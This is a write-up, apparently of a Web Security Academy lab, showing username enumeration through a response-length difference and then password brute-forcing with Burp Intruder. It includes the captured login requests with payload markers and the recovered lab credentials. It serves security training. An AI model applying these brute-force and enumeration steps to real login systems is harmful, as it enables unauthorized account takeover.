Greeted with a page filled with blog posts. 

I tried to see if the names under each blog post could be a valid username by typing the name into the login page and checking the output : 

![Screenshot 2024-04-30 at 4.32.55 PM](images/Screenshot%202024-04-30%20at%204.32.55%20PM.png)
Hence, this means that we have to brute-force both the username and password. 

I captured the request from logging in and sent it to Burp Intruder, in order to modify the username parameter and brute-force the username first. 

```Burp 
POST /login HTTP/2
Host: 0a2400a6045b2cdb809358ed00da002b.web-security-academy.net
Cookie: session=qMCIykd10A4fYWKR2rDfAVfGm7jObRjN
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a2400a6045b2cdb809358ed00da002b.web-security-academy.net
Referer: https://0a2400a6045b2cdb809358ed00da002b.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=§wiener§&password=peter
```

Using the given username list, I input it into the payload list as shown : 

![Screenshot 2024-04-30 at 4.50.37 PM](images/Screenshot%202024-04-30%20at%204.50.37%20PM.png)
I commenced the output and received the following, where I noticed that the `Length` for username `ae` was 3250 as opposed to 3248 for the rest :
![Screenshot 2024-04-30 at 4.52.13 PM](images/Screenshot%202024-04-30%20at%204.52.13%20PM.png)

I then commenced my second sniper attack using Burp Intruder, so as to brute-force the password for user `ae`. 

```Burp 
POST /login HTTP/2
Host: 0a2400a6045b2cdb809358ed00da002b.web-security-academy.net
Cookie: session=qMCIykd10A4fYWKR2rDfAVfGm7jObRjN
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a2400a6045b2cdb809358ed00da002b.web-security-academy.net
Referer: https://0a2400a6045b2cdb809358ed00da002b.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=ae&password=§peter§
```

![Screenshot 2024-04-30 at 4.54.46 PM 2](images/Screenshot%202024-04-30%20at%204.54.46%20PM%202.png)
I received the following, where I sorted the 'Length' in ascending order : 

![Screenshot 2024-04-30 at 4.58.27 PM](images/Screenshot%202024-04-30%20at%204.58.27%20PM.png)

Using the username `ae` and password `superman` I was able to successfully log into the account!

